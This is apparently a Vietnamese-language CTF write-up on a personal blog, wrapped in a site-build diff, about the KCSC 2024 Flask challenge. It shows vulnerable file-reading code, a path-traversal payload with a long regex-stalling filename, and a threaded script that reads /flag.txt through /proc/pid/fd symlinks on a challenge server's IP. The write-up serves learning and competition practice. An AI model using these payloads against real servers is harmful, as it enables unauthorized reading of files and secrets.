+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+    </ul>
+  </nav>
+
+  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
+    
+      <button type="button" class="mode-toggle btn" aria-label="Switch Mode">
+        <i class="fas fa-adjust"></i>
+      </button>
+
+      
+        <span class="icon-border"></span>
+      
+    
+
+    
+      
+
+      
+        <a
+          href="https://github.com/anzuukino"
+          aria-label="github"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+
+      
+        <a
+          href="https://twitter.com/anzuukino"
+          aria-label="twitter"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fa-brands fa-x-twitter"></i>
+        </a>
+      
+    
+      
+
+      
+        <a
+          href="javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')"
+          aria-label="email"
+          
+
+          
+
+          
+
+          
+        >
+          <i class="fas fa-envelope"></i>
+        </a>
+      
+    
+      
+
+      
+        <a
+          href="/feed.xml"
+          aria-label="rss"
+          
+
+          
+
+          
+
+          
+        >
+          <i class="fas fa-rss"></i>
+        </a>
+      
+    
+  </div>
+  <!-- .sidebar-bottom -->
+</aside>
+<!-- #sidebar -->
+
+    
+    <div id="main-wrapper" class="d-flex justify-content-center">
+      <div class="container d-flex flex-column px-xxl-5">
+        <!-- The Top Bar -->
+
+<header id="topbar-wrapper" aria-label="Top Bar">
+  <div
+    id="topbar"
+    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
+  >
+    <nav id="breadcrumb" aria-label="Breadcrumb">
+      
+
+      
+        
+          
+            <span>
+              <a href="/">Home</a>
+            </span>
+
+          
+        
+          
+        
+          
+            
+              <span>KCSC 2024</span>
+            
+
+          
+        
+      
+    </nav>
+    <!-- endof #breadcrumb -->
+
+    <button type="button" id="sidebar-trigger" class="btn btn-link">
+      <i class="fas fa-bars fa-fw"></i>
+    </button>
+
+    <div id="topbar-title">
+      Post
+    </div>
+
+    <button type="button" id="search-trigger" class="btn btn-link">
+      <i class="fas fa-search fa-fw"></i>
+    </button>
+
+    <search class="align-items-center ms-3 ms-lg-0">
+      <i class="fas fa-search fa-fw"></i>
+      <input
+        class="form-control"
+        id="search-input"
+        type="search"
+        aria-label="search"
+        autocomplete="off"
+        placeholder="Search..."
+      >
+    </search>
+    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
+  </div>
+</header>
+
+
+        <div class="row flex-grow-1">
+          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              <!-- Refactor the HTML structure -->
+
+
+
+<!--
+  In order to allow a wide table to scroll horizontally,
+  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
+-->
+
+
+
+<!--
+  Fixed kramdown code highlight rendering:
+  https://github.com/penibelst/jekyll-compress-html/issues/101
+  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
+-->
+
+
+
+<!-- Change the icon of checkbox -->
+
+
+
+<!-- Handle images -->
+
+
+
+
+  
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
+
+<!-- Add header for code snippets -->
+
+
+
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+
+
+
+<!-- return -->
+
+
+
+
+<article class="px-1">
+  <header>
+    <h1 data-toc-skip>KCSC 2024</h1>
+    
+
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1713715200"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Apr 21, 2024
+</time>
+
+      </span>
+
+      <!-- lastmod date -->
+      
+
+      
+
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
+
+          By
+
+          <em>
+            
+              <a href="https://github.com/anzuukino">Yuu</a>
+            
+          </em>
+        </span>
+
+        <div>
+          <!-- pageviews -->
+          
+
+          <!-- read time -->
+          <!-- Calculate the post's reading time, and display the word count in tooltip -->
+
+
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="785 words"
+>
+  <em>4 min</em> read</span>
+
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="content">
+    <h2 id="bài-ka-tuổi-trẻ"><span class="me-2">Bài Ka Tuổi Trẻ</span><a href="#bài-ka-tuổi-trẻ" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Tóm tắt: Challenge này là sử dụng một server flask đơn giản với function đọc file tại endpoint <code class="language-plaintext highlighter-rouge">/</code> với params <code class="language-plaintext highlighter-rouge">file</code> sau đó thêm <code class="language-plaintext highlighter-rouge">./static</code> vào đằng trước file để đọc file trong thư mục static. Phần sau là kiểm tra file có tồn tại không, dung lượng của file phải bé hơn 2MB và có quyền đọc nó thì sẽ tiếp tục đi qua regex nếu qua thì sẽ trả về nội dung của file đó.</p>
+
+<div class="language-py highlighter-rouge"><div class="code-header">
+        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span>
+<span class="kn">from</span> <span class="n">os</span> <span class="kn">import</span> <span class="n">access</span><span class="p">,</span> <span class="n">R_OK</span><span class="p">,</span> <span class="n">stat</span>
+<span class="kn">from</span> <span class="n">os.path</span> <span class="kn">import</span> <span class="n">isfile</span><span class="p">,</span> <span class="n">join</span><span class="p">,</span> <span class="n">normpath</span>
+<span class="kn">import</span> <span class="n">regex</span>
+<span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">static_url_path</span><span class="o">=</span><span class="sh">'</span><span class="s">/static</span><span class="sh">'</span><span class="p">,</span> <span class="n">static_folder</span><span class="o">=</span><span class="sh">'</span><span class="s">static</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="nd">@app.get</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">):</span>
+		<span class="n">filename</span> <span class="o">=</span> <span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">./static</span><span class="sh">"</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">))</span>
+		<span class="k">if</span> <span class="nf">isfile</span><span class="p">(</span><span class="nf">normpath</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span> <span class="ow">and</span> <span class="nf">access</span><span class="p">(</span><span class="nf">normpath</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">R_OK</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="nf">stat</span><span class="p">(</span><span class="nf">normpath</span><span class="p">(</span><span class="n">filename</span><span class="p">)).</span><span class="n">st_size</span> <span class="o">&lt;</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">2</span><span class="p">):</span>
+			<span class="k">try</span><span class="p">:</span>
+				<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="nf">normpath</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+					<span class="k">if</span> <span class="ow">not</span> <span class="n">regex</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">^(([ -~])+.)+([(^~\'!*&lt;&gt;:;,?</span><span class="sh">"</span><span class="s">*|%)]+)|([^\x00-\x7F]+)(([ -~])+.)+$</span><span class="sh">'</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">filename</span><span class="p">:</span>
+						<span class="k">return</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
+			<span class="k">except</span><span class="p">:</span>
+				<span class="k">pass</span>
+	<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">"</span><span class="s">/?file=index.html</span><span class="sh">"</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Bài này nhìn vào là có thể nhận ra ngay dính lỗi path traversal khi chỉ dùng normpath để check path của file. Chúng ta có thể đơn giản là thêm <code class="language-plaintext highlighter-rouge">///</code> vào là path của file sẽ được trỏ về root (ví dụ <code class="language-plaintext highlighter-rouge">///etc/passwd</code>)</p>
+
+<p>Sau khi biết đây là lỗi path traversal thì mình thử kiểm xem filter của regex có thể bypass được không</p>
+
+<p><a href="/assets/KCSC/1.png" class="popup img-link  shimmer"><img src="/assets/KCSC/1.png" alt="alt text" loading="lazy"></a></p>
+
+<p>Đọc xong filter thì thì mình thấy đơn giản regex đầu tiên không có nghĩa gì cả và chặn nếu tên file có chữ <code class="language-plaintext highlighter-rouge">flag</code>. Lúc này thì vừa may có gợi ý là <code class="language-plaintext highlighter-rouge">File descriptor</code> nên mình nghĩ ra một cách khác</p>
+
+<h1 id="file-descriptor">File descriptor</h1>
+
+<p>File descriptor là một định danh độc nhất cho một tập tin cái mà hệ điều hành gán cho nó khi mà mở một file nào đó. Nó cho phép các chương trình tương tác với files, sockets, I/O. File descriptor thường là một số nguyên không âm và được dùng để theo dõi các file và thực hiện thao tác trên nó.</p>
+
+<p>Vậy với cái này thì chúng ta sẽ làm gì ? Nhìn vào đoạn code trên khi mở một file trong text mode (‘w’, ‘r’, ‘wt’, ‘rt’, etc.) thì nó sẽ return một subclass của <code class="language-plaintext highlighter-rouge">io.TextIOBase</code>. Vậy có nghĩa là sao, có nghĩa là nó sẽ mở một file descriptor khi đọc một file. Ta có thể tận dụng cái này để đọc file thông qua việc không cần đọc qua đường đẫn của nó.</p>
+
+<p>Một ví dụ</p>
+
+<p><a href="/assets/KCSC/2.png" class="popup img-link  shimmer"><img src="/assets/KCSC/2.png" alt="alt text" loading="lazy"></a></p>
+
+<h1 id="procpidfd">/proc/pid/fd/</h1>
+
+<p>Đây là thư mục con chứa các symlink trỏ đến một file nào đó. Trong này luôn có các file 0, 1, 2 tương ứng với 0 là input, 1 là output, 2 là error và các file khác có thể là trỏ đến 1 socket nào đó hoặc 1 file cụ thể</p>
+
+<p>Kết hợp hai điều trên ta có thể suy ra được cách giải như sau</p>
+
+<p>Khi mà mở 1 file trong text mode thì nó sẽ mở một file descriptor trong proc/pid/fd (pid là mã số của process đó) và file đó lại symlink đến file ta muốn đọc =&gt; đọc file bất kì</p>
+
+<p>Ví dụ</p>
+
+<p><a href="/assets/KCSC/3.png" class="popup img-link  shimmer"><img src="/assets/KCSC/3.png" alt="alt text" loading="lazy"></a></p>
+
+<p>Vậy để giải bài này thì mình sẽ dùng file descriptor để đọc flag</p>
+
+<p>Nhưng mà có một vấn đề là khi mở file thì nó lại đóng file quá nhanh làm mình chưa kịp access vào process id của nó nên bây giờ mình mới để ý phần regex filter của nó.</p>
+
+<p>Nếu tên file quá dài thì khi đưa qua regex nó sẽ chạy rất lâu(max là 2 giây) và mình có thể tận dụng khoảng thời gian này để vào proc/pid/fd và đọc file</p>
+
+<p>Sau một lúc fuzz thì mình thấy pid của nó nhảy ngẫu nhiên trong các giá trị 1,7,8,9 và file descriptor có tên là 10 sẽ là file symlink đến file mình đọc</p>
+
+<p>Vậy ta có thể request đến server với payload <code class="language-plaintext highlighter-rouge">/?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt</code> để mở một file descriptor link đến file <code class="language-plaintext highlighter-rouge">/flag.txt</code> và do tên quá dài nên regex sẽ bị phải chạy lâu</p>
+
+<p>Trong thời gian 2s, mình gửi đến tất cả pid 1,7,8,9 và đọc file descriptor 10 để đọc flag</p>
+
+<p>Dưới đây là script để tự động lấy flag</p>
+
+<div class="language-py highlighter-rouge"><div class="code-header">
+        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">threading</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://103.163.24.78:8888/?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt</span><span class="sh">"</span>
+
+<span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://103.163.24.78:8888/?file=///proc/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">/fd/10</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="sh">"</span><span class="s">KCSC</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">start1</span><span class="p">():</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">start1</span><span class="p">).</span><span class="nf">start</span><span class="p">()</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="mi">1</span><span class="p">,)).</span><span class="nf">start</span><span class="p">()</span>
+    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="mi">7</span><span class="p">,)).</span><span class="nf">start</span><span class="p">()</span>
+    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="mi">8</span><span class="p">,)).</span><span class="nf">start</span><span class="p">()</span>
+    <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="mi">9</span><span class="p">,)).</span><span class="nf">start</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Và ra flag</p>
+
+<p><a href="/assets/KCSC/4.png" class="popup img-link  shimmer"><img src="/assets/KCSC/4.png" alt="alt text" loading="lazy"></a></p>
+
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+      <div class="post-meta mb-3">
+        <i class="far fa-folder-open fa-fw me-1"></i>
+        
+          <a href="/categories/ctf-writeup/">CTF Writeup</a>
+      </div>
+    
+
+    <!-- tags -->
+    
+      <div class="post-tags">
+        <i class="fa fa-tags fa-fw me-1"></i>
+        
+          <a
+            href="/tags/python/"
+            class="post-tag no-text-decoration"
+          >Python</a>
+        
+          <a
+            href="/tags/flask/"
+            class="post-tag no-text-decoration"
+          >Flask</a>
+        
+          <a
+            href="/tags/path-traversal/"
+            class="post-tag no-text-decoration"
+          >Path Traversal</a>
+        
+      </div>
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
+        
+          
+
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+      
+
+      <a href="https://twitter.com/intent/tweet?text=KCSC%202024%20-%20Yuu's%20blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FKCSCCTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.facebook.com/sharer/sharer.php?title=KCSC%202024%20-%20Yuu's%20blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FKCSCCTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FKCSCCTF%2F&text=KCSC%202024%20-%20Yuu's%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
+
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
+
+
+            
+          </main>
+
+          <!-- panel -->
+          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
+            <div class="access">
+              <!-- Get 5 last posted/updated posts -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <section id="access-lastmod">
+    <h2 class="panel-heading">Recently Updated</h2>
+    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Wannagame-Freshman/">Wannagame Freshman CTF writeup</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/KCSCCTF/">KCSC 2024</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/GreyCTF/">GreyCTF 2024</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/PicoCTF2024/">PicoCTF 2024</a>
+        </li>
+      
+    </ul>
+  </section>
+  <!-- #access-lastmod -->
+
+
+              <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/base64/">Base64</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/flask/">Flask</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">Path Traversal</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
+      
+    </div>
+  </section>
+
+
+            </div>
+
+            
+              
+              
+
+
+
+  <section id="toc-wrapper" class="ps-0 pe-4">
+    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
+          </aside>
+        </div>
+
+        <div class="row">
+          <!-- tail -->
+          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
